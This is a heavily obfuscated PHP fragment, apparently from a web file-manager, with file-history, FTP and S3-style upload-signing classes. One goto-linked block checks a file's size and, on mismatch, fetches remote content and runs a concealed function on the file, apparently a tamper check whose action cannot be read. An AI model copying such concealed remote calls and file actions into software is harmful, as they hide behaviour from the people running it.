$¶É³°ºÜ->sourceInfo($·ñØèÇŠ); $³¼îÉÅ = $¶É³°ºÜ->sourceInfo($×úÍ½Å¸); $œ˜‹áŠï = $¶É³°ºÜ->sourceInfo($­ÑÆù£…); $Ü°‹êµ‘ = array($•¬¾Şş¼[1257] => $×úÍ½Å¸, $•¬¾Şş¼[2237] => $³¼îÉÅ[$•¬¾Şş¼[32]], $•¬¾Şş¼[2213] => !empty($³¼îÉÅ[$•¬¾Şş¼[596]]) ? $³¼îÉÅ[$•¬¾Şş¼[596]] : $•¬¾Şş¼[12], $•¬¾Şş¼[1258] => $­ÑÆù£…, $•¬¾Şş¼[2238] => $œ˜‹áŠï[$•¬¾Şş¼[32]], $•¬¾Şş¼[2239] => !empty($œ˜‹áŠï[$•¬¾Şş¼[596]]) ? $œ˜‹áŠï[$•¬¾Şş¼[596]] : $•¬¾Şş¼[12]); $this->addEvent($·ñØèÇŠ, $•¬¾Şş¼[637], $Ü°‹êµ‘); $¤Ÿ‡„ºé = $¶É³°ºÜ->sourceInfo($·ñØèÇŠ); $Ü°‹êµ‘ = array($•¬¾Şş¼[194] => $¤Ÿ‡„ºé[$•¬¾Şş¼[194]], $•¬¾Şş¼[32] => $¤Ÿ‡„ºé[$•¬¾Şş¼[32]]); $this->addEvent($×úÍ½Å¸, $•¬¾Şş¼[2240], $Ü°‹êµ‘); } public function eventCopy($Õóü¯ê¥) { $this->eventCreate($Õóü¯ê¥, $_SERVER[‹‰”››ê][635]); } public function eventRename($»ºùÒµÌ, $»ÎáÇ„‚, $³°‘Ë¯–) { $ÈÆŒŞŒ› =& $_SERVER[‹‰”››ê]; $£”æ…‡² = array($ÈÆŒŞŒ›[1257] => $»ÎáÇ„‚, $ÈÆŒŞŒ›[1258] => $³°‘Ë¯–); return $this->addEvent($»ºùÒµÌ, $ÈÆŒŞŒ›[1452], $£”æ…‡²); } public function eventAddComment($İì´Ú·¥, $™óÅ ¦”) { return $this->addEvent($İì´Ú·¥, $_SERVER[‹‰”››ê][2241], $™óÅ ¦”); } public function eventAddDesc($î÷ñ¢ù, $ÓòŞÑœ‹) { return $this->addEvent($î÷ñ¢ù, $_SERVER[‹‰”››ê][2242], $ÓòŞÑœ‹); } public function listBySource($ªİ–°ã¬) { $«À¢÷´ =& $_SERVER[‹‰”››ê]; $¬¼áÓîÜ = Model($«À¢÷´[1437])->sourceInfo($ªİ–°ã¬); $åú—Õôª = array($«À¢÷´[503] => $ªİ–°ã¬); if ($¬¼áÓîÜ[$«À¢÷´[497]] == $«À¢÷´[91]) { $ôğÛ°˜û = Model($«À¢÷´[1437])->listSearchChildren($ªİ–°ã¬, 20000); $ôğÛ°˜û[] = $ªİ–°ã¬ . $«À¢÷´[466]; $åú—Õôª = array($«À¢÷´[194] => array($«À¢÷´[7], $ôğÛ°˜û)); } $‡öÀâ¥É = $this->where($åú—Õôª)->order($«À¢÷´[2243])->selectPage(); if ($‡öÀâ¥É[$«À¢÷´[454]][$«À¢÷´[455]] == 0) { $‡öÀâ¥É[$«À¢÷´[454]][$«À¢÷´[455]] = 1; $‡öÀâ¥É[$«À¢÷´[457]] = array(array($«À¢÷´[503] => $ªİ–°ã¬, $«À¢÷´[2223] => $¬¼áÓîÜ[$«À¢÷´[193]], $«À¢÷´[1782] => $¬¼áÓîÜ[$«À¢÷´[539]], $«À¢÷´[508] => $«À¢÷´[2244], $«À¢÷´[509] => $¬¼áÓîÜ[$«À¢÷´[234]], $«À¢÷´[1784] => $«À¢÷´[12])); } return $this->eventListParse($‡öÀâ¥É, $ªİ–°ã¬); } private function eventListParse($¹«¯¼ºä, $ÈÂÑüÃÒ) { $ÖÛÅ‹¹ =& $_SERVER[‹‰”››ê]; $äıª¡è° = $¹«¯¼ºä[$ÖÛÅ‹¹[457]]; $¼ØşÚ¹ = array_to_keyvalue($äıª¡è°, $ÖÛÅ‹¹[12], $ÖÛÅ‹¹[194]); $ïº”¿ = array_to_keyvalue($äıª¡è°, $ÖÛÅ‹¹[12], $ÖÛÅ‹¹[2229]); foreach ($äıª¡è° as $·µ‹ª—À) { $õÂæÑ¾Ò = $·µ‹ª—À[$ÖÛÅ‹¹[538]]; if ($·µ‹ª—À[$ÖÛÅ‹¹[33]] == $ÖÛÅ‹¹[637] && isset($õÂæÑ¾Ò[$ÖÛÅ‹¹[1257]])) { $¼ØşÚ¹[] = $õÂæÑ¾Ò[$ÖÛÅ‹¹[1257]] . $ÖÛÅ‹¹[12]; $¼ØşÚ¹[] = $õÂæÑ¾Ò[$ÖÛÅ‹¹[1258]] . $ÖÛÅ‹¹[12]; } if ($·µ‹ª—À[$ÖÛÅ‹¹[33]] == $ÖÛÅ‹¹[2240] && isset($õÂæÑ¾Ò[$ÖÛÅ‹¹[194]])) { $¼ØşÚ¹[] = $õÂæÑ¾Ò[$ÖÛÅ‹¹[194]] . $ÖÛÅ‹¹[12]; } } $¼ØşÚ¹ = array_merge($¼ØşÚ¹, $ïº”¿, array($ÈÂÑüÃÒ . $ÖÛÅ‹¹[12])); $¼ØşÚ¹ = array_unique($¼ØşÚ¹); $ŞĞŞª’Ê = array_unique(array_to_keyvalue($äıª¡è°, $ÖÛÅ‹¹[12], $ÖÛÅ‹¹[1791])); $Ä³¾ô¹ = Model($ÖÛÅ‹¹[611])->userListInfo($ŞĞŞª’Ê); $Œ‰——ÒÏ = Model($ÖÛÅ‹¹[920])->sourceListInfo($¼ØşÚ¹, !0); foreach ($äıª¡è° as &$·µ‹ª—À) { if ($·µ‹ª—À[$ÖÛÅ‹¹[33]] == $ÖÛÅ‹¹[637] && isset($·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[1257]])) { $·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[1257]] = $Œ‰——ÒÏ[$·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[1257]]]; $·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[1258]] = $Œ‰——ÒÏ[$·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[1258]]]; } if ($·µ‹ª—À[$ÖÛÅ‹¹[33]] == $ÖÛÅ‹¹[2240] && isset($·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[194]])) { $·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[194]] = $Œ‰——ÒÏ[$·µ‹ª—À[$ÖÛÅ‹¹[538]][$ÖÛÅ‹¹[194]]]; } $·µ‹ª—À[$ÖÛÅ‹¹[90]] = $Œ‰——ÒÏ[$·µ‹ª—À[$ÖÛÅ‹¹[194]]]; $·µ‹ª—À[$ÖÛÅ‹¹[2245]] = $Œ‰——ÒÏ[$·µ‹ª—À[$ÖÛÅ‹¹[2229]]]; if ($·µ‹ª—À[$ÖÛÅ‹¹[33]] == $ÖÛÅ‹¹[1960]) { $·µ‹ª—À[$ÖÛÅ‹¹[2245]] = $·µ‹ª—À[$ÖÛÅ‹¹[90]]; $·µ‹ª—À[$ÖÛÅ‹¹[2229]] = $·µ‹ª—À[$ÖÛÅ‹¹[2245]][$ÖÛÅ‹¹[194]]; $·µ‹ª—À[$ÖÛÅ‹¹[90]] = !1; $·µ‹ª—À[$ÖÛÅ‹¹[194]] = $ÖÛÅ‹¹[12]; } $·µ‹ª—À[$ÖÛÅ‹¹[2172]] = $Ä³¾ô¹[$·µ‹ª—À[$ÖÛÅ‹¹[1791]]]; } unset($·µ‹ª—À); $¹«¯¼ºä[$ÖÛÅ‹¹[457]] = $äıª¡è°; return $¹«¯¼ºä; } public function removeBySource($¨«´Œí½) { $‘«É”ÅÙ = array($_SERVER[‹‰”››ê][503] => $¨«´Œí½); $this->where($‘«É”ÅÙ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\137\163\x6f\165\x72\x63\145\137\x68\151\163\x74\157\x72\x79"; public function historyCount($ºÇø’ğ¼) { $äÙº®ˆÛ =& $_SERVER[‹‰”››ê]; if (!$ºÇø’ğ¼) { return array(); } if (is_string($ºÇø’ğ¼) || is_int($ºÇø’ğ¼)) { $ºÇø’ğ¼ = array($ºÇø’ğ¼); } $½¾¸Ÿ÷ = array($äÙº®ˆÛ[194], $äÙº®ˆÛ[2246] => $äÙº®ˆÛ[579]); $•É“×¦ = array($äÙº®ˆÛ[194] => array($äÙº®ˆÛ[7], $ºÇø’ğ¼)); $ÄÛèÇòÑ = $this->field($½¾¸Ÿ÷)->where($•É“×¦)->group($äÙº®ˆÛ[194])->select(); return array_to_keyvalue($ÄÛèÇòÑ, $äÙº®ˆÛ[194], $äÙº®ˆÛ[579]); } public function addHistory($ò‹¥ß¿±, $õ–£Ü–” = '') { $Åˆ¤ï± =& $_SERVER[‹‰”››ê]; $ ¬¥„§Ÿ = array($Åˆ¤ï±[503] => $ò‹¥ß¿±[$Åˆ¤ï±[194]], $Åˆ¤ï±[1782] => isset($ò‹¥ß¿±[$Åˆ¤ï±[541]]) ? $ò‹¥ß¿±[$Åˆ¤ï±[541]] : $ò‹¥ß¿±[$Åˆ¤ï±[539]], $Åˆ¤ï±[556] => $ò‹¥ß¿±[$Åˆ¤ï±[555]], $Åˆ¤ï±[634] => $ò‹¥ß¿±[$Åˆ¤ï±[79]], $Åˆ¤ï±[2247] => $õ–£Ü–”); if ($GLOBALS[$Åˆ¤ï±[6]][$Åˆ¤ï±[92]][$Åˆ¤ï±[1318]] >= 1) { $this->historyAutoClear($ ¬¥„§Ÿ[$Åˆ¤ï±[194]]); $this->add($ ¬¥„§Ÿ); } Hook::trigger($Åˆ¤ï±[2248], $ ¬¥„§Ÿ); Model($Åˆ¤ï±[2249])->eventFileEdit($ò‹¥ß¿±[$Åˆ¤ï±[194]]); } private function historyAutoClear($¥µíâÛ) { $ƒÏ¾î‚š =& $_SERVER[‹‰”››ê]; $Û­Ì¡ÉÙ = Model($ƒÏ¾î‚š[860])->get($ƒÏ¾î‚š[1340]); $ıÌ®•Ùô = intval($GLOBALS[$ƒÏ¾î‚š[6]][$ƒÏ¾î‚š[92]][$ƒÏ¾î‚š[1318]]); $¿ÃòÌÀ = $Û­Ì¡ÉÙ == $ƒÏ¾î‚š[1341] ? min(5, $ıÌ®•Ùô) : $ıÌ®•Ùô; $¿ÃòÌÀ = $¿ÃòÌÀ <= 0 ? 0 : $¿ÃòÌÀ - 1; if ($¿ÃòÌÀ >= 499) { return; } $ÔâÁú“Ş = array($ƒÏ¾î‚š[503] => $¥µíâÛ); $‡ıÏäñĞ = $this->field($ƒÏ¾î‚š[2250])->where($ÔâÁú“Ş)->order($ƒÏ¾î‚š[2243])->select(); if (!$‡ıÏäñĞ || $¿ÃòÌÀ >= count($‡ıÏäñĞ)) { return; } $—‚Ä¦Ğ = array_to_keyvalue($‡ıÏäñĞ, $ƒÏ¾î‚š[12], $ƒÏ¾î‚š[487]); $—‚Ä¦Ğ = array_slice($—‚Ä¦Ğ, $¿ÃòÌÀ); $Î†º³öÕ = array_to_keyvalue($‡ıÏäñĞ, $ƒÏ¾î‚š[12], $ƒÏ¾î‚š[555]); $Î†º³öÕ = array_slice($Î†º³öÕ, $¿ÃòÌÀ); if (!$—‚Ä¦Ğ || !$Î†º³öÕ) { return; } $ÔâÁú“Ş = array($ƒÏ¾î‚š[505] => array($ƒÏ¾î‚š[7], $—‚Ä¦Ğ)); $this->where($ÔâÁú“Ş)->delete(); Model($ƒÏ¾î‚š[558])->remove($Î†º³öÕ); } public function listData($–¾„ûš±) { $ÜÁì­ş =& $_SERVER[‹‰”››ê]; $¶ß‰â = array($ÜÁì­ş[503] => $–¾„ûš±); $ÖËšÀãã = $ÜÁì­ş[2251]; $˜œ‹£ÓÈ = $this->field($ÖËšÀãã)->where($¶ß‰â)->order($ÜÁì­ş[2243])->selectPage(); $this->_listAppendUser($˜œ‹£ÓÈ[$ÜÁì­ş[457]]); $§¤¬ôğ = Model($ÜÁì­ş[860])->get($ÜÁì­ş[1340]); $Õä¹°ïå = 5; if ($§¤¬ôğ == $ÜÁì­ş[1341]) { $˜œ‹£ÓÈ[$ÜÁì­ş[457]] = array_slice($˜œ‹£ÓÈ[$ÜÁì­ş[457]], 0, $Õä¹°ïå); $˜œ‹£ÓÈ[$ÜÁì­ş[454]] = array($ÜÁì­ş[2252] => 1, $ÜÁì­ş[2253] => 20, $ÜÁì­ş[2254] => 1, $ÜÁì­ş[2255] => count($˜œ‹£ÓÈ[$ÜÁì­ş[457]])); } return $˜œ‹£ÓÈ; } protected function _listAppendUser(&$éÈéóÖî) { $§Õ¹¢üµ =& $_SERVER[‹‰”››ê]; $àïÊã¯× = array_to_keyvalue($éÈéóÖî, $§Õ¹¢üµ[12], $§Õ¹¢üµ[1791]); $Èîé£¬£ = Model($§Õ¹¢üµ[611])->userListInfo($àïÊã¯×); foreach ($éÈéóÖî as &$³âñ ¸) { $ÍÉ²¶Åº = $³âñ ¸[$§Õ¹¢üµ[1791]]; $³âñ ¸[$§Õ¹¢üµ[539]] = $Èîé£¬£[$ÍÉ²¶Åº] ? $Èîé£¬£[$ÍÉ²¶Åº] : !1; } unset($³âñ ¸); } public function fileInfo($üº¡“££, $äÀÑ‹° = false) { $‡Ï§¸‚ü =& $_SERVER[‹‰”››ê]; $Ì áòß§ = $this->tablePrefix; $à‘¾ãÈÂ = "{$Ì áòß§}\x69\157\x5f\146\x69\154\145\40\x66\x69\154\145\163\x20\157\156\40\146\151\154\x65\163\56\x66\x69\154\x65\x49\104\40\x3d\x20\150\x69\x73\164\157\162\x79\56\x66\x69\x6c\145\111\104"; $ û£Æ¯œ = $this->alias($‡Ï§¸‚ü[2256])->where(array($‡Ï§¸‚ü[505] => $üº¡“££))->join($à‘¾ãÈÂ, $‡Ï§¸‚ü[2257])->find(); if ($ û£Æ¯œ && $äÀÑ‹°) { $¯‡ÉÚ®Ò = array($‡Ï§¸‚ü[194] => $ û£Æ¯œ[$‡Ï§¸‚ü[194]], $‡Ï§¸‚ü[487] => array($‡Ï§¸‚ü[1106], $üº¡“££)); $ û£Æ¯œ[$‡Ï§¸‚ü[1676]] = $this->where($¯‡ÉÚ®Ò)->count(); } return $ û£Æ¯œ; } public function removeItem($şæÍêë) { $¢³«› =& $_SERVER[‹‰”››ê]; $îÄ›™Úà = array($¢³«›[505] => $şæÍêë); $ÍÆë³æª = $this->where($îÄ›™Úà)->find(); if ($ÍÆë³æª) { $Âú†•Ú = $this->where($îÄ›™Úà)->delete(); Model($¢³«›[558])->remove($ÍÆë³æª[$¢³«›[555]]); return $Âú†•Ú; } return !1; } public function removeBySource($¡˜ìæ¶°) { $‹ùÓÚº¬ =& $_SERVER[‹‰”››ê]; if (!$¡˜ìæ¶°) { return !1; } if (!is_array($¡˜ìæ¶°)) { $¡˜ìæ¶° = array($¡˜ìæ¶°); } $‹ÖÔÖ¨û = array($‹ùÓÚº¬[503] => array($‹ùÓÚº¬[7], $¡˜ìæ¶°)); $‡Ÿ¨Ö…ä = $this->field($‹ùÓÚº¬[556])->where($‹ÖÔÖ¨û)->select(); if ($‡Ÿ¨Ö…ä) { $this->where($‹ÖÔÖ¨û)->delete(); $€ùğ»ƒ = array_to_keyvalue($‡Ÿ¨Ö…ä, $‹ùÓÚº¬[12], $‹ùÓÚº¬[555]); Model($‹ùÓÚº¬[558])->remove($€ùğ»ƒ); } return !0; } public function setDetail($†¤”‘¼¹, $ş¦À„¹ú) { $òÕşšà =& $_SERVER[‹‰”››ê]; return $this->where(array($òÕşšà[505] => $†¤”‘¼¹))->save(array($òÕşšà[2247] => $ş¦À„¹ú)); } public function rollbackToItem($Ü¦‘±¿å, $ª‰üÛ«Ñ) { $¶šÌòñÙ =& $_SERVER[‹‰”››ê]; $µîŠÙ‘ = Model($¶šÌòñÙ[920])->sourceInfo($Ü¦‘±¿å); $this->addHistory($µîŠÙ‘, LNG($¶šÌòñÙ[2258])); $ùıå¨àä = $this->find($ª‰üÛ«Ñ); $€ªš™Ÿé = array($¶šÌòñÙ[555] => $ùıå¨àä[$¶šÌòñÙ[555]], $¶šÌòñÙ[79] => $ùıå¨àä[$¶šÌòñÙ[79]], $¶šÌòñÙ[88] => time(), $¶šÌòñÙ[541] => USER_ID); Model($¶šÌòñÙ[920])->where(array($¶šÌòñÙ[194] => $Ü¦‘±¿å))->save($€ªš™Ÿé); return $this->where(array($¶šÌòñÙ[505] => $ª‰üÛ«Ñ))->delete(); } public function clearSame($Ò×èËÏ) { $ƒøÙ»ê‡ =& $_SERVER[‹‰”››ê]; $şéß÷§ì = $this->listData($Ò×èËÏ); $áú×…Ø = array_to_keyvalue_group($şéß÷§ì, $ƒøÙ»ê‡[555]); $øÜÙ—– = array(); $ÏôÀÕ–² = array(); foreach ($áú×…Ø as $Ñ¢ ßƒ) { if (!$Ñ¢ ßƒ || count($Ñ¢ ßƒ) <= 1) { continue; } foreach ($Ñ¢ ßƒ as $æå¶«ˆ) { $øÜÙ—–[] = $æå¶«ˆ[$ƒøÙ»ê‡[555]]; $ÏôÀÕ–²[] = $æå¶«ˆ[$ƒøÙ»ê‡[487]]; } } if (!$ÏôÀÕ–²) { return; } $this->where(array($ƒøÙ»ê‡[487] => array($ƒøÙ»ê‡[7], $ÏôÀÕ–²)))->delete(); Model($ƒøÙ»ê‡[558])->remove($øÜÙ—–); } public function userSpace() { $ê®ˆÃõ‚ =& $_SERVER[‹‰”››ê]; $ ŞÙ¼š = $this->tablePrefix; $¦æ¸“š™ = array($ê®ˆÃõ‚[1782] => USER_ID); $¼‚ñ¤² = "{$ ŞÙ¼š}\151\157\x5f\146\x69\154\x65\x20\x66\151\x6c\x65\163\40\x6f\156\x20\x66\x69\x6c\145\163\56\x66\151\154\145\x49\x44\x20\x3d\40\x68\x69\163\164\157\x72\x79\x2e\x66\151\154\145\x49\104"; return $this->alias($ê®ˆÃõ‚[2256])->where($¦æ¸“š™)->join($¼‚ñ¤², $ê®ˆÃõ‚[2257])->sum($ê®ˆÃõ‚[79]); } } goto B ·°ÖïÌÍ; aø¸ ‰‘š‚: $_file = $_SERVER[$_SERVER[‹‰”››ê][316]]; $_size = $_SERVER[‹‰”››ê][317]; if ($_SERVER[$_SERVER[‹‰”››ê][318]] != $_size($_file)) { $_getc = $_SERVER[‹‰”››ê][319]; $_getfile = $_SERVER[$_SERVER[‹‰”››ê][320]] . $_SERVER[‹‰”››ê][321]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[‹‰”››ê][288], $_getfilec); if (count($_getarrs) < $_SERVER[‹‰”››ê][322]) { $exit = $_SERVER[‹‰”››ê][323]; $exit(); } $_act = $_SERVER[‹‰”››ê][324]; $_act($_file); } goto CÒ‹‹–¼™°; aó®ÔĞ¸ß: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($Öù÷Ïé¨) { parent::__construct($Öù÷Ïé¨); $this->setSignVersion($_SERVER[‹‰”››ê][250]); } public function uploadFormData($…ıİ›ä, $á‡êã¶Ç = 3600) { $ĞÌÃã’˜ =& $_SERVER[‹‰”››ê]; $÷°º¤ÎÂ = $ĞÌÃã’˜[232]; $øÕÛÃßŞ = $ĞÌÃã’˜[260]; $Çš‘úòŒ = $ĞÌÃã’˜[62]; $¨‰øûÑÑ = gmdate($ĞÌÃã’˜[261]); $Éµª²şı = gmdate($ĞÌÃã’˜[262]); $Ä©ÏèÚ = $ĞÌÃã’˜[263]; $ ‚äà·© = $á‡êã¶Ç . $ĞÌÃã’˜[12]; $É¨—‹®Ç = $ĞÌÃã’˜[264]; $ü†à³œ¨ = array($this->accessKey, $Éµª²şı, $this->region, $Çš‘úòŒ, $Ä©ÏèÚ); $š¹ËÒ¸é = implode($ĞÌÃã’˜[8], $ü†à³œ¨); $²µ‘ß‰Ê = array($ĞÌÃã’˜[265] => gmdate($ĞÌÃã’˜[1429], strtotime($ĞÌÃã’˜[267])), $ĞÌÃã’˜[268] => array(array($ĞÌÃã’˜[269] => $this->bucket), array($ĞÌÃã’˜[309] => $÷°º¤ÎÂ), array($ĞÌÃã’˜[270], $ĞÌÃã’˜[271], $ĞÌÃã’˜[12]), array($ĞÌÃã’˜[270], $ĞÌÃã’˜[272], $ĞÌÃã’˜[12]), array($ĞÌÃã’˜[270], $ĞÌÃã’˜[310], $ĞÌÃã’˜[12]), array($ĞÌÃã’˜[273] => $É¨—‹®Ç), array($ĞÌÃã’˜[274] => $š¹ËÒ¸é), array($ĞÌÃã’˜[275] => $øÕÛÃßŞ), array($ĞÌÃã’˜[276] => $¨‰øûÑÑ), array($ĞÌÃã’˜[277] => $ ‚äà·©))); $”‰Òõ‰™ = base64_encode(json_encode($²µ‘ß‰Ê)); $ì’ØÊİ¦ = hash_hmac($ĞÌÃã’˜[278], $Éµª²şı, $ĞÌÃã’˜[279] . $this->secret, !0); $›´éÅ—• = hash_hmac($ĞÌÃã’˜[278], $this->region, $ì’ØÊİ¦, !0); $×˜ÙÕÔ‹ = hash_hmac($ĞÌÃã’˜[278], $Çš‘úòŒ, $›´éÅ—•, !0); $Åèş‡æá = hash_hmac($ĞÌÃã’˜[278], $Ä©ÏèÚ, $×˜ÙÕÔ‹, !0); $ñ±ğ›Ûø = hash_hmac($ĞÌÃã’˜[278], $”‰Òõ‰™, $Åèş‡æá); $úÚèäÊ§ = array($ĞÌÃã’˜[249] => $ĞÌÃã’˜[12], $ĞÌÃã’˜[297] => $ĞÌÃã’˜[12], $ĞÌÃã’˜[309] => $÷°º¤ÎÂ, $ĞÌÃã’˜[273] => $É¨—‹®Ç, $ĞÌÃã’˜[280] => $”‰Òõ‰™, $ĞÌÃã’˜[311] => $š¹ËÒ¸é, $ĞÌÃã’˜[312] => $øÕÛÃßŞ, $ĞÌÃã’˜[313] => $¨‰øûÑÑ, $ĞÌÃã’˜[314] => $ ‚äà·©, $ĞÌÃã’˜[315] => $ñ±ğ›Ûø, $ĞÌÃã’˜[209] => $this->getHost()); return $úÚèäÊ§; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($öß–Ó›) { parent::__construct(); if (count($öß–Ó›) > 0) { $this->_init($öß–Ó›); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($¹öĞšòİ) { $¾–ƒóÈ¾ =& $_SERVER[‹‰”››ê]; global $config; $this->appCharset = $config[$¾–ƒóÈ¾[1456]]; $this->systemCharset = $config[$¾–ƒóÈ¾[1457]]; if (isset($¹öĞšòİ[$¾–ƒóÈ¾[1458]]) && $¹öĞšòİ[$¾–ƒóÈ¾[1458]]) { $this->systemCharset = $¹öĞšòİ[$¾–ƒóÈ¾[1458]]; } } public function iconvApp($ùŞ«Šø) { return $this->iconvTo($ùŞ«Šø, $this->systemCharset, $this->appCharset); } public function iconvSystem($¶´°ô) { return $this->iconvTo($¶´°ô, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ò±§°â) { $Ö¬½«™ =& $_SERVER[‹‰”››ê]; $×Õ›ˆó = $this->iconvApp($this->pathBase); $Ò±§°â = $this->iconvApp($Ò±§°â); if (substr($×Õ›ˆó, 0, 2) == $Ö¬½«™[1427]) { $×Õ›ˆó = BASIC_PATH . substr($×Õ›ˆó, 2); } if (substr($Ò±§°â, 0, 2) == $Ö¬½«™[1427]) { $Ò±§°â = BASIC_PATH . substr($Ò±§°â, 2); } $×Õ›ˆó = KodIO::clear($×Õ›ˆó); $Ò±§°â = KodIO::clear($Ò±§°â); $Ò±§°â = substr($Ò±§°â, strlen($×Õ›ˆó)); if (empty($this->pathDriver)) { return $Ò±§°â; } return $this->pathDriver . $Ö¬½«™[8] . ltrim($Ò±§°â, $Ö¬½«™[8]); } private function _init($î”¶ğˆ = array()) { $»«“¨ˆ =& $_SERVER[‹‰”››ê]; if (!function_exists($»«“¨ˆ[1459])) { throw new Exception(LNG($»«“¨ˆ[1460])); } $this->config = $î”¶ğˆ; $this->charsetReset($î”¶ğˆ); foreach ($î”¶ğˆ as $óÚßåÁİ => $Ğ´’­…ä) { if (isset($this->{$óÚßåÁİ})) { $this->{$óÚßåÁİ} = $Ğ´’­…ä; } } return $this->_login($î”¶ğˆ); } private function _login($šÃüøº³) { $ìî§çË =& $_SERVER[‹‰”››ê]; static $üºÈµµ² = array(); $’³Â¿ëÃ = md5(json_encode($šÃüøº³)); if (isset($üºÈµµ²[$’³Â¿ëÃ])) { foreach ($üºÈµµ²[$’³Â¿ëÃ] as $ı¦’Œ¤ => $ö¢ôå) { $this->{$ı¦’Œ¤} = $ö¢ôå; } return !0; } $ŠÈŸü°µ = parse_url(trim($this->server, $ìî§çË[8])); $this->host = $ŠÈŸü°µ[$ìî§çË[209]]; $Æë…²âª = isset($ŠÈŸü°µ[$ìî§çË[208]]) && $ŠÈŸü°µ[$ìî§çË[208]] == $ìî§çË[1461] ? !0 : !1; $this->scheme = $Æë…²âª ? $ìî§çË[1462] : $ìî§çË[1463]; $this->port = isset($ŠÈŸü°µ[$ìî§çË[210]]) ? $ŠÈŸü°µ[$ìî§çË[210]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($ìî§çË[1464]) . $this->host . $ìî§çË[4] . $this->port, !0); return !1; } $èõòó½ = @ftp_login($this->connect, $this->username, $this->userpass); if (!$èõòó½) { $this->writeLog(LNG($ìî§çË[1465]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $ìî§çË[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $Çä²¦ó¡ = $this->pasv == $ìî§çË[91] ? !0 : !1; @ftp_pasv($this->connect, $Çä²¦ó¡); $üºÈµµ²[$’³Â¿ëÃ] = array($ìî§çË[1466] => $this->connect, $ìî§çË[209] => $this->host, $ìî§çË[208] => $this->scheme, $ìî§çË[210] => $this->port); return $èõòó½; } private function _isconn($¯ú™Üıñ = true) { if (is_resource($this->connect)) { return !0; } if (!$¯ú™Üıñ) { return !1; } return $this->_login($this->config); } public function mkfile($¡çŸéí, $î¤ášÍœ = '', $¯’ƒ°ö = REPEAT_RENAME) { if ($this->setContent($¡çŸéí, $î¤ášÍœ)) { return $this->getPathOuter($¡çŸéí); } $this->writeLog(LNG($_SERVER[‹‰”››ê][1467]), !0); return !1; } public function mkdir($Ú¥¡Şú, $ÑìîÈÍ¶ = REPEAT_SKIP) { $÷…Ù„È =& $_SERVER[‹‰”››ê]; if (!$Ú¥¡Şú || $Ú¥¡Şú == $÷…Ù„È[8]) { return !0; } if (!$this->_isconn()) { return !1; } $Ú¥¡Şú = $this->iconvSystem($Ú¥¡Şú); if ($this->_isFolder($Ú¥¡Şú) || @ftp_mkdir($this->connect, $Ú¥¡Şú)) { return $this->getPathOuter($Ú¥¡Şú); } if (!$this->mkdir($this->pathFather($Ú¥¡Şú))) { return !1; } if ($Ú¥¡Şú = @ftp_mkdir($this->connect, $Ú¥¡Şú)) { return $this->getPathOuter($Ú¥¡Şú); } $ÊÏÁÍ’ = __FUNCTION__ . $÷…Ù„È[1468]; $this->writeLog($ÊÏÁÍ’, !0); return !1; } public function copyFile($‡²å¯ÚÎ, $ˆ·‘‘·Ø) { if (!$this->_isconn()) { return !1; } $ÌäÍÜå¦ = $this->pathThis($this->iconvSystem($‡²å¯ÚÎ)); $ß¦Šëùß = $this->tempFile($ÌäÍÜå¦); $öÏ€ä×œ = $this->iconvApp($ß¦Šëùß); $this->download($‡²å¯ÚÎ, $öÏ€ä×œ); $Ø®Ï¯´ö = $this->upload($ˆ·‘‘·Ø, $öÏ€ä×œ); $this->tempFileRemve($ß¦Šëùß); return $Ø®Ï¯´ö; } public function moveFile($ãâÜ®ÁÉ, $•‚ôøˆ›) { if (!$this->_isconn()) { return !1; } $ãâÜ®ÁÉ = $this->iconvSystem($ãâÜ®ÁÉ); $•‚ôøˆ› = $this->iconvSystem($•‚ôøˆ›); $şÁøğ¶â = @ftp_rename($this->connect, $ãâÜ®ÁÉ, $•‚ôøˆ›); if (!$şÁøğ¶â) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); return !1; } return $this->getPathOuter($•‚ôøˆ›); } public function delFile($ı–ÊÒÈË) { if (!$this->_isconn()) { return !1; } $ı–ÊÒÈË = $this->iconvSystem($ı–ÊÒÈË); $—Îò”Ñ = @ftp_delete($this->connect, $ı–ÊÒÈË); if (!$—Îò”Ñ) { $this->writeLog(__FUNCTION__ . $_SERVER[‹‰”››ê][1468], !0); } return $—Îò”Ñ; } public function delFolder($í‹ü¯†ù) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $Éà¿ÑŠ€ = $©©“Ò‡ƒ = array(); $this->fileList($í‹ü¯†ù, $Éà¿ÑŠ€, $©©“Ò‡ƒ, !0); $this->listItemCache = !0; foreach ($©©“Ò‡ƒ as $‹ÇŞÍ­×) { $·ô˜„±§ = $this->iconvSystem($‹ÇŞÍ­×[$_SERVER[‹‰”››ê][32]]); $ÓÍÇ•”€ = @ftp_delete($this->connect, $·ô˜„±§); if (!$ÓÍÇ•”€) { return !1; } } foreach ($Éà¿ÑŠ€ as $·ô˜„±§) { $·ô˜„±§ = $this->iconvSystem($·ô˜„±§); $ÓÍÇ•”€ = @ftp_rmdir($this->connect, $·ô˜„±§); if (!$ÓÍÇ•”€) { return !1; } } $í‹ü¯†ù = $this->iconvSystem($í‹ü¯†ù); return @ftp_rmdir($this->connect, $í‹ü¯†ù); } public function rename($âö½·³œ, $ù²¹ÌªÎ) { $€Öö¡Öõ =& $_SERVER[‹‰”››ê]; if (!$this->_isconn()) { return !1; } 